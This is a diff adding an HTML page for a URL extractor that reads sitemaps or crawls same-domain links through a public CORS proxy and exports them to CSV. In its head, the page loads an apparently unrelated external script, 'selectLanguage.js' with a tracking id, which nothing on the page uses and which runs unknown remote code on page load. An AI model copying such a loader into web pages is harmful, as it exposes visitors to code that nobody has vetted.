@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced URL Extractor</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .container {
+            background: #f9f9f9;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+        }
+        input[type="url"] {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        button {
+            padding: 10px 15px;
+            background: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:disabled {
+            background: #ccc;
+        }
+        #stopBtn {
+            background: #ea4335;
+        }
+        .results {
+            margin-top: 20px;
+        }
+        #urlList {
+            width: 100%;
+            height: 300px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-family: monospace;
+        }
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+        .progress {
+            height: 20px;
+            background: #eee;
+            border-radius: 4px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        #progressBar {
+            height: 100%;
+            background: #4285f4;
+            width: 0%;
+            transition: width 0.3s;
+        }
+    </style>
+    <script src="https://accessify.infinite-coders.com/js/selectLanguage.js?id=uD1HiqhRuI"></script>
+</head>
+<body>
+    <div class="container">
+        <h1>Advanced URL Extractor</h1>
+        <div class="input-group">
+            <input type="url" id="targetUrl" placeholder="Enter website URL (e.g., https://example.com)" required>
+            <button id="scrapeBtn">Extract URLs</button>
+            <button id="exportBtn" disabled>Export CSV</button>
+            <button id="stopBtn" disabled>Stop</button>
+        </div>
+        <div class="progress">
+            <div id="progressBar"></div>
+        </div>
+        <div class="stats">
+            <span id="urlCount">0 URLs found</span>
+            <span id="status">Ready</span>
+        </div>
+        <div class="results">
+            <textarea id="urlList" readonly placeholder="Extracted URLs will appear here"></textarea>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const targetUrlInput = document.getElementById('targetUrl');
+            const scrapeBtn = document.getElementById('scrapeBtn');
+            const exportBtn = document.getElementById('exportBtn');
+            const stopBtn = document.getElementById('stopBtn');
+            const urlList = document.getElementById('urlList');
+            const urlCount = document.getElementById('urlCount');
+            const status = document.getElementById('status');
+            const progressBar = document.getElementById('progressBar');
+            
+            let extractedUrls = [];
+            let isScraping = false;
+            let abortController = new AbortController();
+            let crawledUrls = new Set();
+            
+            scrapeBtn.addEventListener('click', startScraping);
+            exportBtn.addEventListener('click', exportToCSV);
+            stopBtn.addEventListener('click', stopScraping);
+            
+            async function startScraping() {
+                if (isScraping) return;
+                
+                const url = targetUrlInput.value.trim();
+                if (!url) {
+                    updateStatus('Please enter a URL', 'error');
+                    return;
+                }
+                
+                try {
+                    isScraping = true;
+                    scrapeBtn.disabled = true;
+                    stopBtn.disabled = false;
+                    extractedUrls = [];
+                    crawledUrls = new Set();
+                    updateStatus('Starting...', 'working');
+                    updateProgress(0);
+                    
+                    // First try sitemap
+                    updateStatus('Checking sitemap.xml...', 'working');
+                    const sitemapUrls = await getSitemapUrls(url);
+                    
+                    if (sitemapUrls.length > 0) {
+                        extractedUrls = sitemapUrls;
+                        updateResults();
+                        updateStatus(`Found ${sitemapUrls.length} URLs in sitemap`, 'success');
+                        return;
+                    }
+                    
+                    // Fall back to crawling
+                    updateStatus('No sitemap found, crawling website...', 'working');
+                    await crawlWebsite(url);
+                    
+                } catch (error) {
+                    console.error('Error:', error);
+                    updateStatus(`Error: ${error.message}`, 'error');
+                } finally {
+                    isScraping = false;
+                    scrapeBtn.disabled = false;
+                    stopBtn.disabled = true;
+                }
+            }
+            
+            async function getSitemapUrls(baseUrl) {
+                try {
+                    const sitemapUrl = new URL('/sitemap.xml', baseUrl).href;
+                    const response = await fetchWithCorsProxy(sitemapUrl);
+                    
+                    if (!response.ok) throw new Error('Sitemap not found');
+                    
+                    const text = await response.text();
+                    const parser = new DOMParser();
+                    const xmlDoc = parser.parseFromString(text, "text/xml");
+                    
+                    // Check if it's a sitemap index
+                    const sitemaps = xmlDoc.getElementsByTagName('sitemap');
+                    if (sitemaps.length > 0) {
+                        return await processSitemapIndex(xmlDoc);
+                    }
+                    
+                    // Regular sitemap
+                    return processSitemap(xmlDoc);
+                } catch (error) {
+                    console.log('Sitemap error:', error.message);
+                    return [];
+                }
+            }
+            
+            async function processSitemapIndex(xmlDoc) {
+                const sitemapUrls = Array.from(xmlDoc.getElementsByTagName('loc'))
+                    .map(loc => loc.textContent.trim());
+                
+                let allUrls = [];
+                
+                for (const sitemapUrl of sitemapUrls) {
+                    try {
+                        const response = await fetchWithCorsProxy(sitemapUrl);
+                        const text = await response.text();
+                        const parser = new DOMParser();
+                        const xmlDoc = parser.parseFromString(text, "text/xml");
+                        const urls = processSitemap(xmlDoc);
+                        allUrls = allUrls.concat(urls);
+                        
+                        updateStatus(`Found ${allUrls.length} URLs in sitemaps...`, 'working');
+                        updateProgress((allUrls.length / (sitemapUrls.length * 100)) * 100);
+                    } catch (error) {
+                        console.error(`Error processing sitemap ${sitemapUrl}:`, error);
+                    }
+                }
+                
+                return allUrls;
+            }
+            
+            function processSitemap(xmlDoc) {
+                return Array.from(xmlDoc.getElementsByTagName('loc'))
+                    .map(loc => normalizeUrl(loc.textContent.trim()))
+                    .filter(url => url);
+            }
+            
+            async function crawlWebsite(startUrl) {
+                const queue = [startUrl];
+                crawledUrls.add(normalizeUrl(startUrl));
+                let processed = 0;
+                const maxPages = 100;
+                
+                while (queue.length > 0 && processed < maxPages && isScraping) {
+                    const currentUrl = queue.shift();
+                    
+                    try {
+                        updateStatus(`Crawling: ${currentUrl}`, 'working');
+                        updateProgress((processed / maxPages) * 100);
+                        
+                        const response = await fetchWithCorsProxy(currentUrl);
+                        if (!response.ok) continue;
+                        
+                        const html = await response.text();
+                        const parser = new DOMParser();
+                        const doc = parser.parseFromString(html, 'text/html');
+                        
+                        // Extract and process links
+                        const links = Array.from(doc.querySelectorAll('a[href]'))
+                            .map(a => a.getAttribute('href'))
+                            .map(href => normalizeUrl(href, currentUrl))
+                            .filter(url => url && !crawledUrls.has(url) && isSameDomain(url, startUrl));
+                        
+                        // Add new URLs to queue
+                        links.forEach(url => {
+                            queue.push(url);
+                            crawledUrls.add(url);
+                        });
+                        
+                        // Add to results
+                        extractedUrls.push(currentUrl);
+                        processed++;
+                        
+                        // Update UI
+                        if (processed % 5 === 0) {
+                            updateResults();
+                        }
+                    } catch (error) {
+                        console.error(`Error crawling ${currentUrl}:`, error);
+                    }
+                }
+                
+                updateResults();
+                updateStatus(`Crawling complete. Found ${extractedUrls.length} URLs`, 'success');
+                updateProgress(100);
+            }
+            
+            function fetchWithCorsProxy(url) {
+                // Using a CORS proxy - replace with your own in production
+                const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(url)}`;
+                return fetch(proxyUrl, {
+                    signal: abortController.signal
+                }).then(response => {
+                    if (!response.ok) throw new Error('Network error');
+                    return response.json();
+                }).then(data => {
+                    if (!data.contents) throw new Error('No content');
+                    return {
+                        ok: true,
+                        text: () => Promise.resolve(data.contents),
+                        json: () => Promise.resolve(JSON.parse(data.contents))
+                    };
+                });
+            }
+            
+            function stopScraping() {
+                isScraping = false;
+                abortController.abort();
+                abortController = new AbortController();
+                updateStatus('Stopped by user', 'error');
+            }
+            
+            function normalizeUrl(url, base) {
+                if (!url) return null;
+                
+                try {
+                    // Clean up URL
+                    url = url.split('#')[0].split('?')[0].trim();
+                    if (!url) return null;
+                    
+                    // Handle relative URLs
+                    const urlObj = new URL(url, base || 'http://example.com');
+                    
+                    // Standardize the URL
+                    let normalized = urlObj.protocol + '//' + urlObj.hostname + urlObj.pathname;
+                    normalized = normalized.replace(/\/+$/, ''); // Remove trailing slashes
+                    
+                    return normalized.toLowerCase();
+                } catch (e) {
+                    return null;
+                }
+            }
+            
+            function isSameDomain(url1, url2) {
+                try {
+                    const domain1 = new URL(url1).hostname;
+                    const domain2 = new URL(url2).hostname;
+                    return domain1 === domain2;
+                } catch (e) {
+                    return false;
+                }
+            }
+            
+            function updateResults() {
+                const uniqueUrls = [...new Set(extractedUrls)].sort();
+                urlList.value = uniqueUrls.join('\n');
+                urlCount.textContent = `${uniqueUrls.length} URLs found`;
+                exportBtn.disabled = uniqueUrls.length === 0;
+            }
+            
+            function updateProgress(percent) {
+                progressBar.style.width = `${percent}%`;
+            }
+            
+            function updateStatus(message, type) {
+                status.textContent = message;
+                status.style.color = type === 'error' ? 'red' : 
+                                   type === 'working' ? 'orange' : 
+                                   'green';
+            }
+            
+            function exportToCSV() {
+                const uniqueUrls = [...new Set(extractedUrls)].sort();
+                const csvContent = "data:text/csv;charset=utf-8," 
+                    + "URL\n" 
+                    + uniqueUrls.map(url => `"${url}"`).join("\n");
+                
+                const encodedUri = encodeURI(csvContent);
+                const link = document.createElement("a");
+                link.setAttribute("href", encodedUri);
+                link.setAttribute("download", "extracted_urls.csv");
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }
+        });
+    </script>
+</body>
+</html>
